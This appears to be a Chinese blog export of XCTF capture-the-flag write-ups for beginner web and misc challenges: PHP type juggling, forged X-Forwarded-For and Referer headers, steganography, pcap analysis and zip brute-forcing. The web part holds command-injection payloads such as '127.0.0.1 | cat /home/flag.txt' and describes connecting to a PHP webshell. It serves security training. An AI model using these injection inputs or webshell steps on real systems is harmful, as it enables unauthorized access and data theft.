title="simple_php"></a>simple_php</h2><p>（1）打开页面，进行代码审计，发现需要输入a，b变量，同时满足a==0 且a为真，b不是数字且b&gt;1234才回返回flag，用get方法输入变量，在URL后加“/?”即可开始赋值，传输多个参数则以”&amp;”间隔。<br><img src="https://img-blog.csdnimg.cn/20201030164501603.png#pic_center" alt="在这里插入图片描述"><br>（2）输入a=0无法得到flag1，因为不满足第二个a为真的条件，所以可以把参数a构造为’0’或abc这种转换后为0，但本身也为真的形式，即str类型。<br><img src="https://img-blog.csdnimg.cn/20201030164537818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）数字和字符混合的字符串转换为整数后只保留数字，所以b可以构造为12345a，类型转换后为12345，大于1234，得到flag。<br><img src="https://img-blog.csdnimg.cn/20201030164614884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p>（1）打开网页后，发现IP是123.123.123.123，使用Firefox浏览器，手动配置代理服务器<br>（2）打开Brup工具抓包，点击代理（Proxy）—拦截请求，刷新原来页面<br><img src="https://img-blog.csdnimg.cn/20201030165650136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）右键选择发送到repeater。在repeater里查看目标地址内容，在Host下方添加：<br>X-Forwarded-For：123.123.123.123（这一步是伪造XFF，点击放包（Forward），收到提示）原来的页面变成了<a href="https://www.google.com/">https://www.google.com</a><br><img src="https://img-blog.csdnimg.cn/2020103016573910.png#pic_center" alt="在这里插入图片描述"><br>（4）在Repeater（重发器），Host下方添加：<br>X-Forwarded-For:123.123.123.123Referer:<a href="https://www.google.com/">https://www.google.com</a>  (这一步是伪造Referer）点击发送，在响应中看到flag<br><img src="https://img-blog.csdnimg.cn/2020103016581839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030165825662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>#XFF漏洞攻击原理及防御方案：<a href="https://www.freebuf.com/company-information/220414.html">https://www.freebuf.com/company-information/220414.html</a></p><p>xff和referer:<br>#X-Forwarded-For：简称xff头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff作用在于记录用户的真实IP，以及代理服务器的IP。格式为：<br>X-Forwarded-For：本机IP，代理1IP，代理2IP。</p><p>#HTTP Referer是header的一部分，当浏览器向Web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基于此可以获得一些有用的信息用于处理。Referer是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用Referer确认访问来源，如果Referer内容不符合要求，服务器可以拦截或者重定向请求。</p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>（1）一句话木马，直接提示给了php一句话，使用菜刀类工具连接（Cknife或中国蚁剑），口令就是shell<br><img src="https://img-blog.csdnimg.cn/20201030165954864.png#pic_center" alt="在这里插入图片描述"><br>（2）这里使用中国蚁剑。右键–&gt;Add,输入URL和口令，选择类型，点击”Add“即可<br><img src="https://img-blog.csdnimg.cn/20201030170109978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）右键–&gt;“FileManager”文件管理，即可发现flag.txt文件，打开获取flag<br><img src="https://img-blog.csdnimg.cn/20201030170159963.png#pic_center" alt="在这里插入图片描述"></p><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p><img src="https://img-blog.csdnimg.cn/20201030175139262.png#pic_center" alt="在这里插入图片描述"><br>（1）尝试输入127.0.0.1，发现可以访问成功<br><img src="https://img-blog.csdnimg.cn/20201030175201626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）输入127.0.0.1 | ls（用&amp;&amp;也可以），看是否能够访问当前目录<br><img src="https://img-blog.csdnimg.cn/20201030175232194.png#pic_center" alt="在这里插入图片描述"><br>（3）访问成功，再试试寻找 .txt文件（或者直接寻找flag.txt文件也可），输入</p><pre><code>127.0.0.1 | find / -name &quot;*.txt&quot;           //寻找.txt文件127.0.0.1 | find / -name &quot;flag.txt&quot;        //寻找flag.txt文件</code></pre><p><img src="https://img-blog.csdnimg.cn/20201030175527632.png#pic_center" alt="在这里插入图片描述"><br>（4）访问成功后都可发现flag.txt文件，用127.0.0.1 | cat /home/flag.txt 即可查看到flag<br><img src="https://img-blog.csdnimg.cn/20201030175542635.png#pic_center" alt="在这里插入图片描述"><br>#命令拼接：管道符“|”，其功能为将前一个命令的结果传递给后一个命令作为输入<br>&amp;&amp;：前一条命令执行成功时，才执行后一条命令</p><pre><code>command1 | command2                                //只输出2的结果command1 &amp;&amp; command2                             // 成功才执行2</code></pre><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p><img src="https://img-blog.csdnimg.cn/20201030175827150.png#pic_center" alt="在这里插入图片描述"><br>（1）打开页面需要输入密码，查看网页源代码，可以发现js代码<br><img src="https://img-blog.csdnimg.cn/20201030175901100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）进行代码审计，发现不论输入什么都会跳到假密码，真密码位于 fromCharCode<br>（3）发现该字符串中用到C语言的转义字符\x，每个\x后面的两位是一个16进制数，直接用C语言printf输出即可得到对应的ASCII码值。<br><img src="https://img-blog.csdnimg.cn/20201030180003309.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030180010836.png#pic_center" alt="在这里插入图片描述"><br>（4）将得到的数字转为ASCII码值即可得到flag<br><img src="https://img-blog.csdnimg.cn/20201030180058366.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030180111939.png#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web练习区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Misc_002</title>
      <link href="2020/11/15/XCTF/XCTF_Misc-002/"/>
      <url>2020/11/15/XCTF/XCTF_Misc-002/</url>
      
        <content type="html"><![CDATA[<h2 id="Janos-the-Ripper"><a href="#Janos-the-Ripper" class="headerlink" title="János-the-Ripper"></a>János-the-Ripper</h2><p>（1）附件是一个压缩包，解压后得到一个没有后缀名的文件，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201031111055252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）是一个压缩包，改后缀名为zip，解压，但需要密码<br><img src="https://img-blog.csdnimg.cn/20201031113641184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）直接暴力破解，得到密码fish<br><img src="https://img-blog.csdnimg.cn/20201031113742969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）得到flag<br><img src="https://img-blog.csdnimg.cn/20201031113816887.png#pic_center" alt="在这里插入图片描述"></p><h2 id="Test-flag-please-ignore"><a href="#Test-flag-please-ignore" class="headerlink" title="Test-flag-please-ignore"></a>Test-flag-please-ignore</h2><p>（1）下载附件，是一个压缩包，解压后用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201101110811501.png#pic_center" alt="在这里插入图片描述">（2）一串十六进制数，转为字符串<br><img src="https://img-blog.csdnimg.cn/20201101110859979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="hit-the-core"><a href="#hit-the-core" class="headerlink" title="hit-the-core"></a>hit-the-core</h2><p>（1）下载附件，得到一个core文件，放到kali下，使用命令strings查看字符串。<br><img src="https://img-blog.csdnimg.cn/20201102174632149.png#pic_center" alt="在这里插入图片描述"></p><p>（2）发现一串特殊的字符，格式像flag，看到前面的大写字母为ALXCTF，相邻的字母之间都隔了4个字符，按照这个规律，写个简单的程序（C语言），提取出flag。</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;strings.h&gt;int main()&#123;    char a[200];    gets(a);    int i=3;    while(a[i] != 0)&#123;        printf(&quot;%c&quot;,a[i]);        i+=5;    &#125;    system(&quot;pause&quot;);    return 0;&#125;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102175004523.png#pic_center" alt="在这里插入图片描述"></p><h2 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h2><p>（1）得到一个附件，是一个捉猫猫游戏。鼓捣了好久，没有发现任何flag信息，最后看了大家的writeup，都是玩通关得出来的。没法，玩呗，玩了好久，终于困住猫了，拿到了flag。<br><img src="https://img-blog.csdnimg.cn/20201103203219434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Banmabanma"><a href="#Banmabanma" class="headerlink" title="Banmabanma"></a>Banmabanma</h2><p>（1）下载附件，一张斑马的图片，看了看，典型的条形码，直接在线扫码<a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a><br><img src="https://img-blog.csdnimg.cn/2020110320424561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）得到flag。<br><img src="https://img-blog.csdnimg.cn/20201103204313481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><p>（1）下载附件，用wireshark打开，选择一个包，追踪tcp流，发现flag。注意格式，直接提交 FLAG:385b87afc8671dee07550290d16a8071 即可。<br><img src="https://img-blog.csdnimg.cn/20201103205333423.png#pic_center" alt="在这里插入图片描述"></p><h2 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h2><p>（1）下载附件，得到一张图片，用stegsolve工具打开，图片太大直接用键盘上的左右键切换视图，在左一视图发现一个二维码。<br><img src="https://img-blog.csdnimg.cn/20201103220936994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）用二维码扫描器扫描，得到一串十六进制数。<br><img src="https://img-blog.csdnimg.cn/20201103221021711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（3）保存到一个文本文档，命名为1.txt，用010 editor导入十六进制，数字的开头为03 F3 ,可知是pyc文件，保存为1.pyc<br><img src="https://img-blog.csdnimg.cn/20201103221315213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（4）用在线工具反编译，<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a><br><img src="https://img-blog.csdnimg.cn/2020110322144843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（5）复制后再Python.exe下执行，由于反编译后得到的是Python2的代码，这里我用的是Python3，要做点修改，最后一行改为print (flag)<br><img src="https://img-blog.csdnimg.cn/20201103222149719.png#pic_center" alt="在这里插入图片描述"><br>（6）前面的“…”是在循环中，按两下回车退出循环，然后再加一个flag(),调用函数，得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Misc进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Misc_001</title>
      <link href="2020/11/15/XCTF/XCTF_Misc-001/"/>
      <url>2020/11/15/XCTF/XCTF_Misc-001/</url>
      
        <content type="html"><![CDATA[<h2 id="base64÷4"><a href="#base64÷4" class="headerlink" title="base64÷4"></a>base64÷4</h2><p><img src="https://img-blog.csdnimg.cn/20201029233527346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029233823554.png#pic_center" alt="在这里插入图片描述"><br>（1）根据题目提示，直接用base16解密得到flag</p><p><img src="https://img-blog.csdnimg.cn/20201029233921359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h2><p>（1）打开附件，发现是一张图片<br><img src="https://img-blog.csdnimg.cn/20201029234035117.png#pic_center" alt="在这里插入图片描述"><br>（2）用画图工具打开该图片，使用水平翻转，即可查看到flag<br><img src="https://img-blog.csdnimg.cn/20201029234114796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029234125317.png#pic_center" alt="在这里插入图片描述"></p><h2 id="something-in-image"><a href="#something-in-image" class="headerlink" title="something_in_image"></a>something_in_image</h2><p>解法一：<br>（1）使用记事本或010 editor工具打开附件，Ctrl+F搜索flag<br><img src="https://img-blog.csdnimg.cn/20201029234240873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029234254152.png#pic_center" alt="在这里插入图片描述"><br>解法二：<br>根据题目包含image，使用kali，命令：strings badimages | grep Flag    （注，根据记事本中常出现的“Flag”，而不是“flag”进行搜索）<br><img src="https://img-blog.csdnimg.cn/2020102923435872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="wireshark-1"><a href="#wireshark-1" class="headerlink" title="wireshark-1"></a>wireshark-1</h2><p>（1）用wireshark打开附件，输入表达式http contains flag查找flag信息，根据题目，看到登录应该查找HTTP post请求，追踪筛选出的报文追踪tcp流，即可看到flag<br><img src="https://img-blog.csdnimg.cn/2020102923460010.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029234609210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="pure-color"><a href="#pure-color" class="headerlink" title="pure_color"></a>pure_color</h2><p>（1）附件是一张全白的png图片<br><img src="https://img-blog.csdnimg.cn/20201029234704614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）用notepad++打开没有发现flag信息<br>（3）用stegsolve打开，打开 File Format Analysis 没有flag的线索<br><img src="https://img-blog.csdnimg.cn/2020102923475148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4)最后在最底下的’&lt;’按钮发现了flag<br><img src="https://img-blog.csdnimg.cn/202010292348317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Aesop-secret"><a href="#Aesop-secret" class="headerlink" title="Aesop_secret"></a>Aesop_secret</h2><p>（1）下载附件得到一张gif的动图，通过stegsolve工具分解得到9张图片<br><img src="https://img-blog.csdnimg.cn/20201029235041213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）用画图工具分别将这九张图通过旋转、裁剪一系列操作，得到9张裁剪过的图，再将这9张裁剪过的图片拼在一起（这里耗费了较多时间），得到如下图<br><img src="https://img-blog.csdnimg.cn/20201029235123359.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029235133815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）图片显示为ISCC，显然不是flag，再用notepad++打开原来的gif动图，发现一串密文<br><img src="https://img-blog.csdnimg.cn/20201029235235364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）用base64解码，无果，根据题目和上面图片的ISCC，联想到AES加密，ISCC则为密钥<br><img src="https://img-blog.csdnimg.cn/202010292352570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）解码后仍然是一串密文，再次解密，得到flag<br><img src="https://img-blog.csdnimg.cn/20201029235319285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="a-good-idea"><a href="#a-good-idea" class="headerlink" title="a_good_idea"></a>a_good_idea</h2><p>（1）打开附件，是一张.jpg格式的图片，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201029235355127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020102923541217.png#pic_center" alt="在这里插入图片描述"><br>（2）确实以FF D8开头，寻找图片结尾FF D9，发现后面还有一个压缩文件<br><img src="https://img-blog.csdnimg.cn/20201029235436753.png#pic_center" alt="在这里插入图片描述"><br>（3）将原图片后缀名改为.zip，解压后得到一个文件夹，里面是两张相同的图片和一个hint提示文本<br><img src="https://img-blog.csdnimg.cn/20201029235502674.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029235519348.png#pic_center" alt="在这里插入图片描述"><br>（4）hint为“试着找出像素的秘密”，用stegsolve工具合成这两张图片，发现一些红点，貌似是二维码<br><img src="https://img-blog.csdnimg.cn/20201029235544453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）用wps图片编辑，在“工具”中选择“色彩”，将亮度和饱和度调到最高<br><img src="https://img-blog.csdnimg.cn/2020102923562537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）发现还是不太明显，先保存这张图片，再用wps图片工具打开，再调一遍亮度和饱和度<br><img src="https://img-blog.csdnimg.cn/20201029235702553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）可以看到清晰的二维码图片，用二维码扫描工具扫描图片，发现flag<br><img src="https://img-blog.csdnimg.cn/2020102923573284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Training-Stegano-1"><a href="#Training-Stegano-1" class="headerlink" title="Training-Stegano-1"></a>Training-Stegano-1</h2><p>一张bmp格式的图片，直接用notepad++打开，即可看flag，注意提交时不用加flag{}<br><img src="https://img-blog.csdnimg.cn/20201029235912499.png#pic_center" alt="在这里插入图片描述"></p><h2 id="can-has-stdio"><a href="#can-has-stdio" class="headerlink" title="can_has_stdio?"></a>can_has_stdio?</h2><p>（1）用notepad++打开附件<br><img src="https://img-blog.csdnimg.cn/20201029235946797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现是Brainfuck文件，用在线解析工具得到flag<a href="http://ctf.ssleye.com/brain.html">http://ctf.ssleye.com/brain.html</a><br><img src="https://img-blog.csdnimg.cn/20201030000056979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>#Brainfuck解析规则：<br>     “&gt;”: 指针位置右移一位<br>    “&lt;”: 指针位置左移一位<br>     +: 指针所指向的位置里面的值加1<br>     -: 指针所指向的位置里面的值减1<br>     . :输出指针当前位置指向单元格中的内容<br>     [: 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处<br>     ]:如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处(额…好像比较难理解,只是用于循环某一段代码而已,两个一般联合使用)</p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Misc进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Misc练习区</title>
      <link href="2020/11/15/XCTF/XCTF_Misc%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
      <url>2020/11/15/XCTF/XCTF_Misc%E7%BB%83%E4%B9%A0%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>(1)附件是一个没有后缀的文件，使用notepad++打开，Ctrl+F出现搜索框，搜索flag<br><img src="https://img-blog.csdnimg.cn/20201029151711345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029151757386.png#pic_center" alt="在这里插入图片描述"><br>（2）发现在O7avZhikgKgbF目录下有个flag文件，用7-ZIP工具打开附件，找到flag.txt文件。<br><img src="https://img-blog.csdnimg.cn/20201029151943811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020102915202880.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029152125452.png#pic_center" alt="在这里插入图片描述"><br>（3）出现了一串base64加密的字符串，这里我用的是CaptfEncoder工具，解码后得flag{sajbcmbzskjjcnbhsbvcjbjszcszbkzj}<br><img src="https://img-blog.csdnimg.cn/20201029152641255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h2><p>（1）附件是一个.pcapng文件，使用Wireshark打开文件查看报文查找flag信息，输入表达式http contains flag查看http协议的报文是否包含flag 的信息<br><img src="https://img-blog.csdnimg.cn/20201029152930291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）根据筛选出的报文，追踪tcp流，在第1150个报文中发现一串十六进制的流信息，其中，FFD8是jpg文件头标志，FFD9是结束标志，说明这里有一张jpg格式的图片。<br><img src="https://img-blog.csdnimg.cn/202010291533526.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201029153359337.png#pic_center" alt="在这里插入图片描述"><br>（3）将这部分信息复制到一个文本文档.txt中保存，用010 editor工具以十六进制导入，并另存为jpg格式，得到一张图片<br><img 